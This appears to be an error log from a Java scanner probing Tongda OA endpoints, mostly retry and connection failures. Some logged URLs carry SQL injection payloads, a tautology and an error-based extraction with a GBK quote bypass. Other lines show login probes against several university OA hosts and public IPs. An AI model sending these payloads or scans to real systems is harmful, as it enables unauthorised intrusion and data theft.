+2024-09-11 14:15:47  [ Thread-3:25 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:24:20  [ Thread-3:2 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 14:41:11  [ Thread-3:3 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 15:28:17  [ Thread-3:3 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 15:28:32  [ Thread-4:14613 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 15:29:07  [ Thread-5:49318 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/ispirit/retrieve_pwd.php?_GET[username]=admin%27+and+%271%27%3D%271+发生错误:java.lang.NullPointerException , retrying...1
+2024-09-11 15:29:09  [ Thread-5:52160 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/ispirit/retrieve_pwd.php?_GET[username]=admin%27+and+%271%27%3D%271+发生错误:java.lang.NullPointerException , retrying...2
+2024-09-11 15:29:12  [ Thread-5:54650 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/ispirit/retrieve_pwd.php?_GET[username]=admin%27+and+%271%27%3D%271+发生错误:java.lang.NullPointerException , retrying...3
+2024-09-11 15:29:13  [ Thread-5:55651 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 15:29:14  [ Thread-5:57118 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/interface/go.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23发生错误:java.lang.NullPointerException , retrying...1
+2024-09-11 15:29:17  [ Thread-5:59558 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/interface/go.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23发生错误:java.lang.NullPointerException , retrying...2
+2024-09-11 15:29:19  [ Thread-5:62125 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/interface/go.php?PASSWORD=1&USER_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23发生错误:java.lang.NullPointerException , retrying...3
+2024-09-11 15:29:20  [ Thread-5:63129 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 15:29:22  [ Thread-5:64852 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1&tab=5发生错误:java.lang.NullPointerException , retrying...1
+2024-09-11 15:29:25  [ Thread-5:67333 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1&tab=5发生错误:java.lang.NullPointerException , retrying...2
+2024-09-11 15:29:27  [ Thread-5:70123 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1&tab=5发生错误:java.lang.NullPointerException , retrying...3
+2024-09-11 15:29:28  [ Thread-5:71128 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 15:29:30  [ Thread-5:72609 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/module/retrieve_pwd/header.inc.php发生错误:java.lang.NullPointerException , retrying...1
+2024-09-11 15:29:32  [ Thread-5:75028 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/module/retrieve_pwd/header.inc.php发生错误:java.lang.NullPointerException , retrying...2
+2024-09-11 15:29:35  [ Thread-5:77537 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/module/retrieve_pwd/header.inc.php发生错误:java.lang.NullPointerException , retrying...3
+2024-09-11 15:29:36  [ Thread-5:78542 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 15:29:37  [ Thread-5:80060 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/module/appbuilder/assets/print.php发生错误:java.lang.NullPointerException , retrying...1
+2024-09-11 15:29:40  [ Thread-5:82710 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/module/appbuilder/assets/print.php发生错误:java.lang.NullPointerException , retrying...2
+2024-09-11 15:29:43  [ Thread-5:85308 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/module/appbuilder/assets/print.php发生错误:java.lang.NullPointerException , retrying...3
+2024-09-11 15:29:44  [ Thread-5:86320 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 15:29:45  [ Thread-5:87829 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/general/login_code.php发生错误:java.lang.NullPointerException , retrying...1
+2024-09-11 15:29:48  [ Thread-5:90318 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/general/login_code.php发生错误:java.lang.NullPointerException , retrying...2
+2024-09-11 15:29:50  [ Thread-5:92804 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/general/login_code.php发生错误:java.lang.NullPointerException , retrying...3
+2024-09-11 15:29:51  [ Thread-5:93806 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 15:29:53  [ Thread-5:95292 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/module/ueditor/php/action_crawler.php发生错误:java.lang.NullPointerException , retrying...1
+2024-09-11 15:29:55  [ Thread-5:97742 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/module/ueditor/php/action_crawler.php发生错误:java.lang.NullPointerException , retrying...2
+2024-09-11 15:29:55  [ Thread-5:97770 ] - [ ERROR ]  Interrupted exception: sleep interrupted
+2024-09-11 15:31:14  [ Thread-6:176240 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 15:33:28  [ Thread-3:4 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 15:33:32  [ Thread-4:4115 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-11 15:45:34  [ Thread-3:2 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-12 10:46:21  [ Thread-4:2 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-12 11:20:45  [ Thread-3:3 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-12 11:24:58  [ Thread-4:3 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-12 11:28:59  [ Thread-3:2 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-12 11:36:28  [ Thread-4:448673 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-12 11:40:59  [ Thread-3:2 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-12 11:50:12  [ Thread-3:3 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-12 11:51:12  [ Thread-3:3 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-12 11:52:43  [ Thread-3:1 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-12 11:54:47  [ Thread-3:2 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-12 11:55:14  [ Thread-3:5 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-12 14:26:19  [ Thread-3:4 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-12 14:49:16  [ Thread-3:2 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-12 14:54:35  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gues.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Unexpected end of file from server , retrying...1
+2024-09-12 14:54:37  [ Thread-3:2500 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gues.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Unexpected end of file from server , retrying...2
+2024-09-12 14:54:39  [ Thread-3:3992 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gues.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Unexpected end of file from server , retrying...3
+2024-09-12 14:54:40  [ Thread-3:4995 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-12 14:55:14  [ Thread-4:39105 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gues.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...1
+2024-09-12 14:55:15  [ Thread-4:40607 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gues.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...2
+2024-09-12 14:55:17  [ Thread-4:42111 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gues.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...3
+2024-09-12 14:55:18  [ Thread-4:43112 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-12 14:57:34  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gzittc.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...1
+2024-09-12 14:57:35  [ Thread-3:1562 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gzittc.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...2
+2024-09-12 14:57:37  [ Thread-3:3134 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gzittc.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...3
+2024-09-12 14:57:38  [ Thread-3:4135 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-12 14:58:42  [ Thread-6:68068 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://oa.pkuschool.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...1
+2024-09-12 14:58:43  [ Thread-6:69520 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://oa.pkuschool.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...2
+2024-09-12 14:58:45  [ Thread-6:70972 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://oa.pkuschool.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...3
+2024-09-12 14:58:46  [ Thread-6:71973 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-12 14:59:08  [ Thread-7:94420 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.zmdvtc.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Unexpected end of file from server , retrying...1
+2024-09-12 14:59:10  [ Thread-7:96008 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.zmdvtc.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Unexpected end of file from server , retrying...2
+2024-09-12 14:59:11  [ Thread-7:97595 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.zmdvtc.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Unexpected end of file from server , retrying...3
+2024-09-12 14:59:12  [ Thread-7:98596 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-12 15:00:46  [ Thread-10:192106 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gues.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...1
+2024-09-12 15:00:47  [ Thread-10:193601 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gues.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...2
+2024-09-12 15:00:49  [ Thread-10:195091 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gues.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...3
+2024-09-12 15:00:50  [ Thread-10:196091 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-12 15:01:25  [ Thread-12:231613 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gzittc.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...1
+2024-09-12 15:01:27  [ Thread-12:233192 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gzittc.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...2
+2024-09-12 15:01:28  [ Thread-12:234757 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://oa.gzittc.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...3
+2024-09-12 15:01:29  [ Thread-12:235758 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-12 15:02:28  [ Thread-13:294634 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://oa.ymcn.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...1
+2024-09-12 15:02:30  [ Thread-13:296096 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://oa.ymcn.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...2
+2024-09-12 15:02:31  [ Thread-13:297515 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://oa.ymcn.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Connection reset , retrying...3
+2024-09-12 15:02:32  [ Thread-13:298517 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-12 15:03:14  [ Thread-16:340531 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://moa.glmc.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Unexpected end of file from server , retrying...1
+2024-09-12 15:03:16  [ Thread-16:341964 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://moa.glmc.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Unexpected end of file from server , retrying...2
+2024-09-12 15:03:20  [ Thread-16:346062 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://moa.glmc.edu.cn/ispirit/interface/login.php发生错误:java.net.SocketException: Unexpected end of file from server , retrying...3
+2024-09-12 15:03:21  [ Thread-16:347065 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-12 15:16:41  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://localhost/ispirit/interface/login.php发生错误:javax.net.ssl.SSLHandshakeException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target , retrying...1
+2024-09-12 15:16:43  [ Thread-3:1115 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://localhost/ispirit/interface/login.php发生错误:javax.net.ssl.SSLHandshakeException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target , retrying...2
+2024-09-12 15:16:44  [ Thread-3:2148 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:https://localhost/ispirit/interface/login.php发生错误:javax.net.ssl.SSLHandshakeException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target , retrying...3
+2024-09-12 15:16:45  [ Thread-3:3150 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-12 15:24:15  [ Thread-15:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://175.0.99.71:808/ispirit/interface/login.php发生错误:java.net.SocketTimeoutException: Connect timed out , retrying...1
+2024-09-12 15:24:26  [ Thread-15:11044 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://175.0.99.71:808/ispirit/interface/login.php发生错误:java.net.SocketTimeoutException: Connect timed out , retrying...2
+2024-09-12 15:24:37  [ Thread-15:22060 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://175.0.99.71:808/ispirit/interface/login.php发生错误:java.net.SocketTimeoutException: Connect timed out , retrying...3
+2024-09-12 15:24:38  [ Thread-15:23061 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-12 15:24:53  [ Thread-16:38085 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://36.133.154.105:8090/ispirit/interface/login.php发生错误:java.net.SocketException: Unexpected end of file from server , retrying...1
+2024-09-12 15:24:54  [ Thread-16:39452 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://36.133.154.105:8090/ispirit/interface/login.php发生错误:java.net.SocketException: Unexpected end of file from server , retrying...2
+2024-09-12 15:24:55  [ Thread-16:40810 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://36.133.154.105:8090/ispirit/interface/login.php发生错误:java.net.SocketException: Unexpected end of file from server , retrying...3
+2024-09-12 15:24:56  [ Thread-16:41811 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-13 09:51:31  [ Thread-4:2 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-13 09:58:28  [ Thread-3:2 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-13 11:07:05  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-13 11:07:08  [ Thread-3:3282 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-13 11:07:12  [ Thread-3:6538 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-13 11:07:13  [ Thread-3:7553 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-13 11:07:22  [ Thread-3:17266 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-13 11:07:26  [ Thread-3:20513 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-13 11:07:29  [ Thread-3:23758 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-13 11:07:30  [ Thread-3:24758 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-13 11:07:47  [ Thread-3:41738 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-13 11:07:53  [ Thread-4:48042 ] - [ ERROR ]  Interrupted exception: Task was interrupted
+2024-09-14 09:32:25  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 09:32:28  [ Thread-3:3261 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-14 09:32:32  [ Thread-3:6489 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-14 09:32:33  [ Thread-3:7505 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-14 09:32:44  [ Thread-3:18839 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 09:32:47  [ Thread-3:22101 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-14 09:32:51  [ Thread-3:25331 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-14 09:32:52  [ Thread-3:26334 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-14 09:33:12  [ Thread-3:47080 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 09:33:16  [ Thread-3:50344 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-14 09:33:19  [ Thread-3:53600 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-14 09:33:20  [ Thread-3:54601 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-14 09:38:33  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 09:38:37  [ Thread-3:3266 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-14 09:38:40  [ Thread-3:6520 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-14 09:38:41  [ Thread-3:7523 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-14 09:38:50  [ Thread-3:16747 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 09:38:53  [ Thread-3:19981 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-14 09:38:57  [ Thread-3:23236 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-14 09:38:58  [ Thread-3:24236 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-14 09:39:16  [ Thread-3:42421 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 09:39:19  [ Thread-3:45707 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-14 09:39:22  [ Thread-3:48974 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-14 09:39:23  [ Thread-3:49986 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-14 09:52:55  [ Thread-3:0 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 09:52:59  [ Thread-3:3246 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-14 09:53:02  [ Thread-3:6479 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-14 09:53:03  [ Thread-3:7491 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-14 09:53:12  [ Thread-3:16581 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 09:53:15  [ Thread-3:19837 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
+2024-09-14 09:53:18  [ Thread-3:23084 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...3
+2024-09-14 09:53:19  [ Thread-3:24087 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-14 09:53:38  [ Thread-3:42419 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...1
+2024-09-14 09:53:41  [ Thread-3:45694 ] - [ ERROR ]  Task failed:java.util.concurrent.ExecutionException: java.lang.IllegalArgumentException: url:http://127.0.0.1:8000/发生错误:java.net.ConnectException: Connection refused: connect , retrying...2
